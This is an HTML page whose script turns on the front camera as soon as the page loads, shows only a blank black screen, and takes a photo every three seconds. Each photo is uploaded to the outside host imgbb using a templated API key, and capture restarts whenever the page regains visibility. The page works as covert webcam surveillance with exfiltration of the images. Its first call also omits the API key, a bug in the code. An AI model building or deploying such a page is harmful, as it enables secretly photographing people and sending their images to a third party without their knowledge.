<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Continuous Image Upload</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            overflow: hidden;
        }
    </style>
</head>
<body>

<script>
let captureInterval;

function startCapturingAndUploading(apiKey) {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // Use front camera
    .then(function(stream) {
        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
        
        function captureAndUpload() {
            imageCapture.takePhoto()
            .then(blob => {
                const formData = new FormData();
                formData.append('image', blob);

                fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, {
                    method: 'POST',
                    body: formData,
                })
                .then(response => response.json())
                .then(data => {
                    if (data.data) {
                        console.log('Upload successful:', data.data.url);
                        // Optionally, vibrate on success
                        if (navigator.vibrate) navigator.vibrate(200);
                    } else {
                        console.log('Failed to upload image. Retrying...');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            })
            .catch(error => {
                console.error('Error taking photo:', error);
            });
        }

        captureInterval = setInterval(captureAndUpload, 3000); // Adjust time as needed
    })
    .catch(function(err) {
        console.error('Error accessing the camera: ', err);
    });
}

document.addEventListener("visibilitychange", function() {
    if (document.visibilityState === 'hidden') {
        clearInterval(captureInterval);
    } else {
        const apiKey = '{{ secrets.IMGBB_API_KEY }}'; // Access the API key from GitHub Secrets
        startCapturingAndUploading(apiKey);
    }
});

startCapturingAndUploading(); // Start the process automatically
</script>
</body>
</html>
